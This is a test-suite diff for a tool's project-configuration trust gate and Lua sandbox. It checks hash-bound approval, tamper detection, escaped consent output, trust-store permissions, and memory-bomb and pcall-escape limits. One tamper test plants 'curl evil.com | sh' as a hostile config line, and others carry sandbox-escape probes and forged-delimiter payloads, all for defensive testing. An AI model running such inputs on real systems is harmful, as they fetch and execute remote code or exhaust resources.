@@ -415,7 +415,7 @@ local EXPECTED_COMMANDS = {
   {
     id = "trust",
     title = "Wheel: trust",
-    description = "Inspect and approve project configuration (.wheel/init.lua).",
+    description = "Inspect, approve, or revoke project configuration trust.",
   },
   {
     id = "team",
@@ -1170,8 +1170,17 @@ run_test("Wheel Init: command schemas and invocation validation", function()
     assert(def.args_schema.type == "object", "command arguments must be an object for " .. expected.id)
     assert(def.args_schema.additionalProperties == false,
       "command arguments must reject unknown fields for " .. expected.id)
-    assert(def.args_schema.properties == nil,
-      "the current command contract declares no argument properties for " .. expected.id)
+    if expected.id == "trust" then
+      assert(type(def.args_schema.properties) == "table",
+        "trust must declare its optional action/hash/path fields")
+      assert_args_valid(def.args_schema, { action = "show" })
+      assert_args_valid(def.args_schema, { action = "confirm", hash = string.rep("a", 64) })
+      assert_args_invalid(def.args_schema, { action = "yes" }, "enum")
+      assert_args_invalid(def.args_schema, { action = "confirm", hash = string.rep("a", 63) })
+    else
+      assert(def.args_schema.properties == nil,
+        "the current command contract declares no argument properties for " .. expected.id)
+    end
     assert_args_valid(def.args_schema, {})
     assert_args_invalid(def.args_schema, { unexpected = true }, "unknown field")
 
@@ -2329,11 +2338,109 @@ run_test("WheelConfig: sandboxed evaluation restricts ambient authority", functi
   assert(tbl.safe_val == 12345, "safe variables should evaluate properly")
   assert(string.polluted == nil, "standard library tables must be isolated from sandbox mutation")
 
-  -- Expensive string.rep bounds check
-  local big_rep = "return { big = string.rep('A', 100000) }"
+  -- Instruction-hook and memory-bound hardening: pcall/xpcall are absent, the
+  -- string/table wrappers reject numeric strings and cap per-call and total
+  -- allocation, and error text does not leak the harness source path.
+  local pcall_probe = [[
+    return {
+      has_pcall = pcall ~= nil,
+      has_xpcall = xpcall ~= nil,
+    }
+  ]]
+  local ok_pcall, pcall_tbl = WheelConfig.eval_chunk(pcall_probe, "pcall_probe")
+  assert(ok_pcall == true, "the pcall probe must evaluate")
+  assert(pcall_tbl.has_pcall == false, "pcall must not be exposed to project configuration")
+  assert(pcall_tbl.has_xpcall == false, "xpcall must not be exposed to project configuration")
+
+  local big_rep = "return { big = string.rep('A', 2097152) }"
   local ok_rep, err_rep = WheelConfig.eval_chunk(big_rep, "big_rep_test")
-  assert(ok_rep == false, "string.rep > 65536 must fail closed")
-  assert(string.find(tostring(err_rep), "safety bound") ~= nil, "error message specifies safety bound")
+  assert(ok_rep == false, "string.rep above the per-call cap must fail closed")
+  assert(string.find(tostring(err_rep), "safety bound") ~= nil,
+    "error message specifies the safety bound")
+  assert(string.find(tostring(err_rep), "wheel/config.lua", 1, true) == nil,
+    "sandbox bounds errors must not leak the harness source path")
+
+  local numeric_rep = "return { big = string.rep('A', '200000') }"
+  local ok_numeric, err_numeric = WheelConfig.eval_chunk(numeric_rep, "numeric_rep_test")
+  assert(ok_numeric == false, "a numeric-string string.rep count must fail closed")
+  assert(string.find(tostring(err_numeric), "non%-negative integer number") ~= nil,
+    "numeric-string rejection must use the typed bound message")
+
+  local nested_rep = "return { big = string.rep(string.rep('A', 1024), 65536) }"
+  local ok_nested, err_nested = WheelConfig.eval_chunk(nested_rep, "nested_rep_test")
+  assert(ok_nested == false, "nested string.rep expansion must fail closed")
+  assert(string.find(tostring(err_nested), "safety bound") ~= nil,
+    "nested string.rep must report the safety bound")
+
+  local concat_bomb = [[
+    return { big = table.concat({
+      string.rep('A', 600000),
+      string.rep('A', 600000),
+    }) }
+  ]]
+  local ok_concat, err_concat = WheelConfig.eval_chunk(concat_bomb, "concat_bomb_test")
+  assert(ok_concat == false, "table.concat above the per-call cap must fail closed")
+  assert(string.find(tostring(err_concat), "safety bound") ~= nil,
+    "table.concat must report the safety bound")
+
+  local total_bomb = [[
+    local values = {}
+    for i = 1, 8 do
+      values[i] = string.rep('A', 600000)
+    end
+    return { count = #values }
+  ]]
+  local ok_total, err_total = WheelConfig.eval_chunk(total_bomb, "total_bomb_test")
+  assert(ok_total == false, "cumulative string.rep expansion must fail closed")
+  assert(string.find(tostring(err_total), "cumulative safety bound") ~= nil,
+    "cumulative cap must be reported distinctly")
+
+  -- Method syntax resolves the real string table through the string metatable;
+  -- the real table is patched for the eval duration as well.
+  local original_rep = string.rep
+  local original_concat = table.concat
+  local method_rep = "return { big = ('x'):rep(2097152) }"
+  local ok_method, err_method = WheelConfig.eval_chunk(method_rep, "method_rep_test")
+  assert(ok_method == false, "method-form string.rep above the cap must fail closed")
+  assert(string.find(tostring(err_method), "safety bound") ~= nil,
+    "method-form string.rep must report the safety bound")
+
+  local method_separator = "return { big = ('x'):rep(1024, ('y'):rep(2000)) }"
+  local ok_sep, err_sep = WheelConfig.eval_chunk(method_separator, "method_separator_test")
+  assert(ok_sep == false, "method-form string.rep separator expansion must fail closed")
+  assert(string.find(tostring(err_sep), "safety bound") ~= nil,
+    "separator expansion must report the safety bound")
+
+  local method_total = [[
+    local values = {}
+    for i = 1, 8 do
+      values[i] = ('A'):rep(600000)
+    end
+    return { count = #values }
+  ]]
+  local ok_method_total, err_method_total = WheelConfig.eval_chunk(
+    method_total, "method_total_test")
+  assert(ok_method_total == false, "method-form cumulative string.rep must fail closed")
+  assert(string.find(tostring(err_method_total), "cumulative safety bound") ~= nil,
+    "method-form cumulative cap must be reported")
+
+  assert(string.rep == original_rep and table.concat == original_concat,
+    "the real string/table tables must be restored after every eval path")
+  assert(("x"):rep(3) == "xxx", "string method syntax must work after restoration")
+
+  local ok_runtime, err_runtime = WheelConfig.eval_chunk(
+    "local value = string.rep('A', 10)\nreturn { bad = value + {} }", "restore_error_test")
+  assert(ok_runtime == false, "an ordinary runtime error must fail the chunk")
+  assert(string.rep == original_rep and table.concat == original_concat,
+    "the real string/table tables must be restored after a runtime error")
+  assert(string.find(tostring(err_runtime), "runtime error") ~= nil)
+
+  -- The hook error is no longer catchable because pcall/xpcall are absent.
+  local pcall_escape = "while true do pcall(function() for i=1,2000000 do end end) end return {}"
+  local ok_escape, err_escape = WheelConfig.eval_chunk(pcall_escape, "pcall_escape_test")
+  assert(ok_escape == false, "a pcall hook escape must fail closed")
+  assert(string.find(tostring(err_escape), "pcall") ~= nil,
+    "the escape attempt must fail on the unavailable pcall")
 
   -- Infinite loop instruction count limit
   local infinite_loop = "while true do end return {}"
@@ -2402,7 +2509,7 @@ run_test("WheelConfig: hierarchical layering (Defaults < Global < Project)", fun
   os.execute("rm -rf " .. tmp_dir)
 end)
 
-run_test("WheelConfig: direnv-style security trust gate, tamper detection, and untrust", function()
+run_test("WheelConfig: direct trust requires the exact current hash", function()
   local tmp_dir = "/tmp/bitty/test_wheel_trust_gate"
   local proj_dir = tmp_dir .. "/my_repo"
   local trust_file = tmp_dir .. "/trusted_projects.json"
@@ -2413,7 +2520,7 @@ run_test("WheelConfig: direnv-style security trust gate, tamper detection, and u
   f:write('return { verification = { test_command = "make test" } }')
   f:close()
 
-  -- 1. Untrusted project config must fail closed in strict mode
+  -- 1. Untrusted project config must fail closed in strict mode.
   local res1 = WheelConfig.load({
     project_root = proj_dir,
     trust_file = trust_file,
@@ -2424,13 +2531,41 @@ run_test("WheelConfig: direnv-style security trust gate, tamper detection, and u
   assert(res1.layers.project == false, "project layer must not be loaded when untrusted")
   assert(res1.config.verification.test_command == "just check", "must fall back to safe defaults")
 
-  -- 2. Trust the project config
-  local content1 = 'return { verification = { test_command = "make test" } }'
-  local ok_t, err_t, hash1 = WheelConfig.trust(proj_dir, content1, trust_file)
-  assert(ok_t == true, "trust should succeed: " .. tostring(err_t))
-  assert(hash1 ~= nil)
+  local status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(status.ok == true, "trust status must inspect the entry")
+  assert(#status.hash == 64 and status.hash:match("^%x+$") ~= nil,
+    "the consent hash must be the full 64-hex SHA-256")
+  assert(status.content:find("make test", 1, true) ~= nil,
+    "the consent view must include the full entry content")
+  assert(status.root == WheelConfig.canonical_root(proj_dir),
+    "the record root must be the canonical project root")
 
-  -- 3. Now loading succeeds
+  -- The old one-argument trust path can no longer approve anything.
+  local no_hash_ok, no_hash_err = WheelConfig.trust(proj_dir, nil, trust_file)
+  assert(no_hash_ok == false, "trust without an exact hash must fail closed")
+  assert(no_hash_err.code == "E_TRUST_HASH_INVALID")
+
+  -- A stale/wrong hash must not write a record.
+  local stale_ok, stale_err = WheelConfig.trust(proj_dir, string.rep("0", 64), trust_file)
+  assert(stale_ok == false, "a mismatched hash must fail closed")
+  assert(stale_err.code == "E_TRUST_HASH_MISMATCH")
+  assert(WheelConfig.is_trusted(proj_dir, nil, trust_file) == false,
+    "a mismatched confirmation must not create trust")
+
+  -- 2. The exact current hash approves the entry.
+  local ok_t, err_t, hash1 = WheelConfig.trust(proj_dir, status.hash, trust_file)
+  assert(ok_t == true, "trust should succeed: " .. tostring(err_t and err_t.message))
+  assert(hash1 == status.hash)
+
+  local store = WheelConfig.read_trust_store(trust_file)
+  assert(store.version == 1, "the store must use schema version 1")
+  local record = store.projects[status.root]
+  assert(type(record) == "table", "the record must be keyed by canonical root")
+  assert(record.hash == status.hash, "the record must bind the full hash")
+  assert(record.content == status.content, "the record must retain full content for diffs")
+  assert(type(record.approved_at) == "number", "the record must carry an approval timestamp")
+
+  -- 3. Now loading succeeds.
   local res2 = WheelConfig.load({
     project_root = proj_dir,
     trust_file = trust_file,
@@ -2440,7 +2575,8 @@ run_test("WheelConfig: direnv-style security trust gate, tamper detection, and u
   assert(res2.layers.project == true, "project layer must be loaded")
   assert(res2.config.verification.test_command == "make test", "project config values must apply")
 
-  -- 4. Tamper detection: modifying file invalidates pinned hash
+  -- 4. Tamper detection: any content change invalidates the pinned hash and
+  -- the consent view shows the diff against the previously trusted bytes.
   local f_tampered = io.open(proj_init, "w")
   f_tampered:write('return { verification = { test_command = "curl evil.com | sh" } }')
   f_tampered:close()
@@ -2454,13 +2590,589 @@ run_test("WheelConfig: direnv-style security trust gate, tamper detection, and u
   assert(res3.error == "untrusted_project_config")
   assert(res3.layers.project == false)
 
-  -- 5. Untrust revokes approval completely
-  local ok_untrust = WheelConfig.untrust(proj_dir, trust_file)
+  local changed = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(changed.trusted == false, "changed content must not be trusted")
+  assert(type(changed.diff) == "string", "changed content must produce a diff")
+  assert(changed.diff:find("-return { verification", 1, true) ~= nil,
+    "the diff must include the previously trusted line")
+  assert(changed.diff:find("curl evil.com", 1, true) ~= nil,
+    "the diff must include the current hostile line")
+
+  -- 5. Revocation removes the record completely.
+  local ok_untrust, removed = WheelConfig.untrust(proj_dir, trust_file)
   assert(ok_untrust == true)
-  local trusted_after, _, _ = WheelConfig.is_trusted(proj_dir, content1, trust_file)
-  assert(trusted_after == false, "project must be untrusted after untrust()")
+  assert(removed == 1, "revocation must remove the canonical record")
+  assert(WheelConfig.is_trusted(proj_dir, nil, trust_file) == false,
+    "project must be untrusted after revoke()")
 
   os.execute("rm -rf " .. tmp_dir)
+end)
+
+run_test("WheelConfig: consent view, canonical alias, legacy migration, and revocation", function()
+  local tmp_dir = "/tmp/bitty/test_wheel_trust_consent"
+  local real_dir = tmp_dir .. "/real"
+  local link_dir = tmp_dir .. "/link"
+  local trust_file = tmp_dir .. "/trusted_projects.json"
+  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. real_dir .. "/.wheel")
+  os.execute("ln -s " .. real_dir .. " " .. link_dir)
+
+  local proj_init = real_dir .. "/.wheel/init.lua"
+  local content = 'return { verification = { test_command = "make consent" }, panel = { name = "consent-panel" } }\n'
+  local f = io.open(proj_init, "w")
+  f:write(content)
+  f:close()
+
+  local status = WheelConfig.trust_status(link_dir, trust_file)
+  assert(status.ok == true)
+  assert(status.root == real_dir, "the trust root must resolve the symlink")
+  assert(status.bytes == #content, "the status must report exact entry bytes")
+
+  local show = WheelConfig.format_trust_show(status)
+  assert(show:find(real_dir, 1, true) ~= nil, "the consent view must show the canonical root")
+  assert(show:find(status.hash, 1, true) ~= nil, "the consent view must show the full hash")
+  assert(show:find('return { verification = { test_command = "make consent"', 1, true) ~= nil,
+    "the consent view must show the full content")
+  assert(show:find("Effects are evaluated only after confirmation", 1, true) ~= nil,
+    "the consent view must state the effects ordering")
+  assert(show:find("cannot be produced without evaluating", 1, true) ~= nil,
+    "the consent view must say a pre-consent effects list is unavailable")
+  assert(show:find("--- DIFF AGAINST PREVIOUSLY TRUSTED CONTENT [", 1, true) ~= nil,
+    "the consent view must include the nonce-delimited diff section")
+
+  -- Approve through the symlink; the store must contain only the real root.
+  local ok, err = WheelConfig.trust(link_dir, status.hash, trust_file)
+  assert(ok == true, tostring(err and err.message))
+  local store = WheelConfig.read_trust_store(trust_file)
+  assert(store.projects[real_dir] ~= nil, "approval through a link must store the real root")
+  assert(store.projects[link_dir] == nil, "the alias itself must not be stored")
+
+  -- A legacy flat string store is accepted as hash-only and migrated on the
+  -- next successful trust.
+  local legacy_file = tmp_dir .. "/legacy.json"
+  local legacy = io.open(legacy_file, "w")
+  legacy:write('{"' .. real_dir .. '":"' .. status.hash .. '"}')
+  legacy:close()
+  os.execute("chmod 600 " .. legacy_file)
+  local legacy_store, warning = WheelConfig.read_trust_store(legacy_file)
+  assert(warning == nil, "a valid legacy store must be accepted")
+  assert(legacy_store.version == 1)
+  local legacy_record = legacy_store.projects[real_dir]
+  assert(type(legacy_record) == "table" and legacy_record.hash == status.hash,
+    "legacy string values must become hash-only records")
+  assert(legacy_record.content == nil, "legacy records have no content until re-approval")
+
+  local legacy_status = WheelConfig.trust_status(link_dir, legacy_file)
+  assert(legacy_status.trusted == true, "a legacy hash-only record must still trust a matching hash")
+  assert(legacy_status.diff == nil and legacy_status.diff_note ~= nil,
+    "a hash-only record must explain that no diff is available")
+
+  local migrated_ok = WheelConfig.trust(link_dir, status.hash, legacy_file)
+  assert(migrated_ok == true)
+  local migrated = WheelConfig.read_trust_store(legacy_file)
+  assert(migrated.projects[real_dir].content == content,
+    "the next successful trust must migrate the legacy record to full content")
+
+  -- A legacy record keyed by an alias path is still matched through the host
+  -- and rewritten under the canonical root.
+  local alias_file = tmp_dir .. "/alias.json"
+  local alias_store_file = io.open(alias_file, "w")
+  alias_store_file:write('{"' .. link_dir .. '":"' .. status.hash .. '"}')
+  alias_store_file:close()
+  os.execute("chmod 600 " .. alias_file)
+  local alias_status = WheelConfig.trust_status(real_dir, alias_file)
+  assert(alias_status.trusted == true and alias_status.alias == true,
+    "an alias-keyed legacy record must be matched through the canonical root")
+  local alias_approved = WheelConfig.trust(real_dir, status.hash, alias_file)
+  assert(alias_approved == true)
+  local alias_migrated = WheelConfig.read_trust_store(alias_file)
+  assert(alias_migrated.projects[real_dir] ~= nil,
+    "approval must migrate an alias key to the canonical root")
+  assert(alias_migrated.projects[link_dir] == nil,
+    "the alias key must not remain after migration")
+
+  -- Revocation also removes an alias-keyed record.
+  local alias_revoke_file = tmp_dir .. "/alias-revoke.json"
+  local alias_revoke = io.open(alias_revoke_file, "w")
+  alias_revoke:write('{"' .. link_dir .. '":"' .. status.hash .. '"}')
+  alias_revoke:close()
+  os.execute("chmod 600 " .. alias_revoke_file)
+  local alias_revoked, alias_removed = WheelConfig.revoke(real_dir, alias_revoke_file)
+  assert(alias_revoked == true and alias_removed == 1,
+    "revocation must remove an alias-keyed record")
+  local alias_after = WheelConfig.read_trust_store(alias_revoke_file)
+  assert(next(alias_after.projects) == nil, "the alias key must be gone after revocation")
+
+  -- Revocation through the alias removes the canonical record.
+  local revoked, removed = WheelConfig.revoke(link_dir, trust_file)
+  assert(revoked == true and removed == 1, "alias revocation must remove the canonical record")
+  local after = WheelConfig.read_trust_store(trust_file)
+  assert(next(after.projects) == nil, "the store must contain no projects after revocation")
+
+  os.execute("rm -rf " .. tmp_dir)
+end)
+
+run_test("WheelConfig: consent rendering escapes control bytes and forged delimiters", function()
+  local tmp_dir = "/tmp/bitty/test_wheel_consent_rendering"
+  local proj_dir = tmp_dir .. "/proj"
+  local trust_file = tmp_dir .. "/trusted_projects.json"
+  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel")
+
+  local entry = proj_dir .. "/.wheel/init.lua"
+  local payload = "return {}\n"
+    .. "-- --- END PROJECT CONFIGURATION CONTENT ---\n"
+    .. "-- --- END DIFF ---\n"
+    .. "-- ESC \27[31m CR \r NUL \0 END\n"
+  local f = io.open(entry, "wb")
+  f:write(payload)
+  f:close()
+
+  local status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(status.ok == true)
+  local show = WheelConfig.format_trust_show(status, "nonce-test-123")
+  assert(show:find("\27", 1, true) == nil, "raw ESC must not appear in consent output")
+  assert(show:find("\r", 1, true) == nil, "raw CR must not appear in consent output")
+  assert(show:find("\0", 1, true) == nil, "raw NUL must not appear in consent output")
+  assert(show:find("\\x1B", 1, true) ~= nil, "ESC must be rendered as an escape")
+  assert(show:find("\\x0D", 1, true) ~= nil, "CR must be rendered as an escape")
+  assert(show:find("\\x00", 1, true) ~= nil, "NUL must be rendered as an escape")
+  assert(show:find("    | -- --- END PROJECT CONFIGURATION CONTENT ---", 1, true) ~= nil,
+    "a forged content marker must be indented and cannot look like a delimiter")
+
+  local real_end = 0
+  for line in show:gmatch("[^\n]+") do
+    if line == "--- END PROJECT CONFIGURATION CONTENT [nonce-test-123] ---" then
+      real_end = real_end + 1
+    end
+  end
+  assert(real_end == 1, "exactly one nonce-delimited content terminator must exist")
+  assert(show:find("--- BEGIN PROJECT CONFIGURATION CONTENT [nonce-test-123] ---", 1, true) ~= nil,
+    "the begin delimiter must carry the per-run nonce")
+  assert(show:find("--- END DIFF [nonce-test-123] ---", 1, true) ~= nil,
+    "the diff delimiter must carry the per-run nonce")
+
+  local summary = WheelConfig.format_trust_summary(status, 7)
+  assert(summary:find(status.hash, 1, true) ~= nil, "the summary must carry the full hash")
+  assert(summary:find("7 notification chunk(s)", 1, true) ~= nil,
+    "the summary must state the notification chunk count")
+
+  os.execute("rm -rf " .. tmp_dir)
+end)
+
+run_test("WheelConfig: bounded reader, entry type checks, and no pre-consent evaluation", function()
+  local tmp_dir = "/tmp/bitty/test_wheel_trust_bounds"
+  local proj_dir = tmp_dir .. "/proj"
+  local outside = tmp_dir .. "/outside.lua"
+  local trust_file = tmp_dir .. "/trusted_projects.json"
+  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel")
+
+  local proj_init = proj_dir .. "/.wheel/init.lua"
+
+  -- A symlinked entry is refused before any read/hash.
+  local outside_file = io.open(outside, "w")
+  outside_file:write("return {}\n")
+  outside_file:close()
+  os.execute("ln -s " .. outside .. " " .. proj_init)
+  local symlink_status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(symlink_status.ok == false and symlink_status.code == "E_PROJECT_CONFIG_SYMLINK",
+    "a symlinked entry must fail closed before read")
+  os.execute("rm -f " .. proj_init)
+
+  -- A non-regular entry is refused.
+  os.execute("mkdir -p " .. proj_init)
+  local directory_status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(directory_status.ok == false and directory_status.code == "E_PROJECT_CONFIG_NOT_REGULAR",
+    "a directory entry must fail closed")
+  os.execute("rmdir " .. proj_init)
+
+  -- Oversize is refused by the bounded reader without evaluating anything.
+  local big = io.open(proj_init, "w")
+  big:write(string.rep("A", WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1))
+  big:close()
+  local large_status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(large_status.ok == false and large_status.code == "E_PROJECT_CONFIG_TOO_LARGE",
+    "an entry above the cap must be refused")
+  local truncated = WheelHost.fs.read_file_bounded(proj_init, WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1)
+  assert(#truncated == WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1,
+    "the bounded reader must stop at cap + 1 bytes")
+  local large_load = WheelConfig.load({ project_root = proj_dir, trust_file = trust_file })
+  assert(large_load.ok == false and large_load.error == "project_config_rejected",
+    "the loader must refuse an oversized entry before the trust check")
+
+  -- A file larger than cap+1 is read only up to cap+1.
+  local huge = io.open(proj_init, "wb")
+  huge:write(string.rep("B", 1024 * 1024))
+  huge:close()
+  local bounded_huge = WheelHost.fs.read_file_bounded(
+    proj_init, WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1)
+  assert(#bounded_huge == WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1,
+    "a reader over cap+1 must still stop at cap+1 bytes")
+
+  -- Exactly the cap is accepted.
+  local exact = io.open(proj_init, "w")
+  exact:write(string.rep("A", WheelConfig.MAX_PROJECT_CONFIG_BYTES))
+  exact:close()
+  local exact_status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(exact_status.ok == true and exact_status.bytes == WheelConfig.MAX_PROJECT_CONFIG_BYTES,
+    "an entry exactly at the cap must be accepted")
+
+  -- `..` in the project root resolves through the host and cannot create a
+  -- separate lexical trust key.
+  local dotdot = proj_dir .. "/sub/.."
+  os.execute("mkdir -p " .. proj_dir .. "/sub")
+  local dotdot_root = WheelConfig.canonical_root(dotdot)
+  assert(dotdot_root == proj_dir, "`..` must resolve to the canonical root")
+
+  -- PWD is not authority: a lying PWD cannot change the canonical root.
+  local expected_pwd_pipe = assert(io.popen("pwd -P"))
+  local expected_pwd = expected_pwd_pipe:read("*l")
+  expected_pwd_pipe:close()
+  local original_getenv = os.getenv
+  os.getenv = function(name)
+    if name == "PWD" then
+      return "/tmp/bitty/definitely-not-the-project-root"
+    end
+    return original_getenv(name)
+  end
+  local pwd_ok, pwd_root = pcall(WheelConfig.canonical_root, ".")
+  os.getenv = original_getenv
+  assert(pwd_ok and pwd_root == expected_pwd,
+    "canonical_root must ignore a lying PWD: " .. tostring(pwd_root))
+
+  -- An untrusted entry is never evaluated: the value would be visible only if
+  -- the loader executed it.
+  local untrusted = io.open(proj_init, "w")
+  untrusted:write('return { verification = { test_command = "EVALUATED" } }')
+  untrusted:close()
+  local load = WheelConfig.load({ project_root = proj_dir, trust_file = trust_file })
+  assert(load.ok == false and load.error == "untrusted_project_config",
+    "untrusted content must not load")
+  assert(load.config.verification.test_command == "just check",
+    "untrusted content must have no configuration effect")
+
+  -- A missing store path fails closed instead of using /tmp.
+  assert(WheelConfig.get_trust_store_path({}) == nil,
+    "no XDG_STATE_HOME/HOME means no trust-store path")
+  local missing_store, missing_warning = WheelConfig.read_trust_store(nil, {})
+  assert(missing_warning ~= nil and missing_warning.code == "E_TRUST_STORE_UNAVAILABLE",
+    "a missing store path must surface a fail-closed warning")
+  assert(next(missing_store.projects) == nil)
+
+  os.execute("rm -rf " .. tmp_dir)
+end)
+
+run_test("WheelConfig: corrupt, symlinked, writable, and foreign-version stores fail closed", function()
+  local tmp_dir = "/tmp/bitty/test_wheel_trust_store_security"
+  local proj_dir = tmp_dir .. "/proj"
+  local store_dir = tmp_dir .. "/state/wheel"
+  local trust_file = store_dir .. "/trusted_projects.json"
+  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel " .. store_dir)
+  os.execute("chmod 700 " .. store_dir)
+
+  local proj_init = proj_dir .. "/.wheel/init.lua"
+  local f = io.open(proj_init, "w")
+  f:write("return { verification = { test_command = \"trusted\" } }\n")
+  f:close()
+
+  local corrupt = io.open(trust_file, "w")
+  corrupt:write("{not-json")
+  corrupt:close()
+  os.execute("chmod 600 " .. trust_file)
+
+  local store, warning = WheelConfig.read_trust_store(trust_file)
+  assert(warning ~= nil and warning.code == "E_TRUST_STORE_CORRUPT",
+    "corrupt JSON must return a warning, not a silent empty store")
+  assert(next(store.projects) == nil, "a corrupt store must not grant trust")
+  local trusted, _, _, trust_warning = WheelConfig.is_trusted(proj_dir, nil, trust_file)
+  assert(trusted == false and trust_warning ~= nil,
+    "a corrupt store must leave the project untrusted and surface the warning")
+  local status = WheelConfig.trust_status(proj_dir, trust_file)
+  assert(status.store_warning and status.store_warning.code == "E_TRUST_STORE_CORRUPT")
+  assert(WheelConfig.format_trust_show(status):find("Trust store warning", 1, true) ~= nil,
+    "the consent view must surface a corrupt store")
+
+  local confirm_ok, confirm_err = WheelConfig.trust(proj_dir, status.hash, trust_file)
+  assert(confirm_ok == false and confirm_err.code == "E_TRUST_STORE_CORRUPT",
+    "approval must fail closed while the store is corrupt")
+
+  -- A group/world-writable store is refused.
+  os.execute("chmod 666 " .. trust_file)
+  local _, writable_warning = WheelConfig.read_trust_store(trust_file)
+  assert(writable_warning ~= nil and writable_warning.code == "E_TRUST_STORE_PERMISSIONS",
+    "a group/world-writable store must fail closed")
+  os.execute("chmod 600 " .. trust_file)
+
+  -- A group/world-writable store directory is also refused on read.
+  os.execute("chmod 777 " .. store_dir)
+  local _, dir_warning = WheelConfig.read_trust_store(trust_file)
+  assert(dir_warning ~= nil and dir_warning.code == "E_TRUST_STORE_PERMISSIONS",
+    "a group/world-writable store directory must fail closed")
+  os.execute("chmod 700 " .. store_dir)
+
+  -- An unreadable store is surfaced and never treated as approved.
+  os.execute("chmod 000 " .. trust_file)
+  local _, unreadable_warning = WheelConfig.read_trust_store(trust_file)
+  assert(unreadable_warning ~= nil and unreadable_warning.code == "E_TRUST_STORE_UNREADABLE",
+    "an unreadable store must fail closed")
+  os.execute("chmod 600 " .. trust_file)
+
+  -- A symlinked store is refused.
+  os.execute("rm -f " .. trust_file .. " && ln -s " .. proj_init .. " " .. trust_file)
+  local _, symlink_warning = WheelConfig.read_trust_store(trust_file)
+  assert(symlink_warning ~= nil and symlink_warning.code == "E_TRUST_STORE_SYMLINK",
+    "a symlinked store must fail closed")
+  local write_ok, write_err = WheelConfig.write_trust_store({ version = 1, projects = {} }, trust_file)
+  assert(write_ok == false and write_err.code == "E_TRUST_STORE_SYMLINK",
+    "writing through a symlinked store must be refused")
+  os.execute("rm -f " .. trust_file)
+
+  -- A foreign schema version is not interpreted as the current schema.
+  local foreign = io.open(trust_file, "w")
+  foreign:write('{"version":99,"projects":{}}')
+  foreign:close()
+  os.execute("chmod 600 " .. trust_file)
+  local _, version_warning = WheelConfig.read_trust_store(trust_file)
+  assert(version_warning ~= nil and version_warning.code == "E_TRUST_STORE_VERSION",
+    "a foreign schema version must fail closed")
+
+  -- A successful approval repairs the store with 0700/0600 and schema 1.
+  os.execute("rm -f " .. trust_file)
+  local fresh = WheelConfig.trust_status(proj_dir, trust_file)
+  local approved = WheelConfig.trust(proj_dir, fresh.hash, trust_file)
+  assert(approved == true)
+  local written = WheelConfig.read_trust_store(trust_file)
+  assert(written.version == 1 and written.projects[fresh.root] ~= nil)
+  local listing = WheelHost.fs.list_dir(store_dir)
+  assert(listing.ok, "cannot list the trust store directory")
+  local line = listing.stdout:match("[^\n]*trusted_projects%.json[^\n]*")
+  assert(line and line:sub(1, 10) == "-rw-------",
+    "the trust store must be mode 0600: " .. tostring(line))
+  local dir_line = WheelHost.proc.run_program("ls", { "-ld", store_dir })
+  assert(dir_line.ok and dir_line.stdout:sub(1, 10) == "drwx------",
+    "the trust store directory must be mode 0700")
+
+  -- Foreign ownership is rejected with a mocked stat result (a real chown is
+  -- not available to a non-root test process).
+  local backend = WheelHost.backend
+  local original_stat = backend.stat
+  backend.stat = function(path)
+    local info = original_stat(path)
+    if path == trust_file and type(info.uid) == "number" then
+      info.uid = info.uid + 1
+    end
+    return info
+  end
+  local foreign_ok, _, foreign_warning = pcall(WheelConfig.read_trust_store, trust_file)
+  backend.stat = original_stat
+  assert(foreign_ok and foreign_warning ~= nil
+    and foreign_warning.code == "E_TRUST_STORE_FOREIGN_OWNED",
+    "a foreign-owned store must fail closed")
+
+  -- An unresolvable record is preserved rather than silently dropped during
+  -- an unrelated write.
+  local missing_root = "/tmp/bitty/ctx0020-not-mounted-project"
+  local preserve_file = tmp_dir .. "/preserve.json"
+  local preserve_store = {
+    version = 1,
+    projects = {
+      [fresh.root] = {
+        hash = fresh.hash,
+        content = fresh.content,
+        approved_at = 1,
+      },
+      [missing_root] = {
+        hash = string.rep("b", 64),
+        content = "return {}\n",
+        approved_at = 1,
+      },
+    },
+  }
+  local preserve_ok, preserve_err = WheelConfig.write_trust_store(preserve_store, preserve_file)
+  assert(preserve_ok == true, tostring(preserve_err and preserve_err.message))
+  local preserved = WheelConfig.read_trust_store(preserve_file)
+  assert(preserved.projects[missing_root] ~= nil,
+    "an unresolvable record must be preserved, not silently dropped")
+
+  -- Write-side caps match the read-side caps: an over-size store is refused
+  -- before it can become unreadable and lose every approval.
+  local oversize_file = tmp_dir .. "/oversize.json"
+  local oversize = { version = 1, projects = {} }
+  for index = 1, 40 do
+    oversize.projects["/tmp/bitty/ctx0020-oversize-" .. index] = {
+      hash = string.rep("c", 64),
+      content = string.rep("A", WheelConfig.MAX_PROJECT_CONFIG_BYTES),
+      approved_at = 1,
+    }
+  end
+  local oversize_ok, oversize_err = WheelConfig.write_trust_store(oversize, oversize_file)
+  assert(oversize_ok == false and oversize_err.code == "E_TRUST_STORE_TOO_LARGE",
+    "an over-size store must be refused on write")
+  assert(WheelHost.fs.exists(oversize_file) == false,
+    "a refused over-size store must not be created")
+
+  local count_file = tmp_dir .. "/count.json"
+  local count_store = { version = 1, projects = {} }
+  for index = 1, WheelConfig.MAX_TRUST_STORE_PROJECTS + 1 do
+    count_store.projects["/tmp/bitty/ctx0020-count-" .. index] = {
+      hash = string.rep("d", 64),
+    }
+  end
+  local count_ok, count_err = WheelConfig.write_trust_store(count_store, count_file)
+  assert(count_ok == false and count_err.code == "E_TRUST_STORE_TOO_LARGE",
+    "a store above the project count cap must be refused on write")
+  assert(WheelHost.fs.exists(count_file) == false,
+    "a refused count-cap store must not be created")
+
+  os.execute("rm -rf " .. tmp_dir)
+end)
+
+run_test("WheelConfig: confirmation repairs a user-owned store parent and preserves records", function()
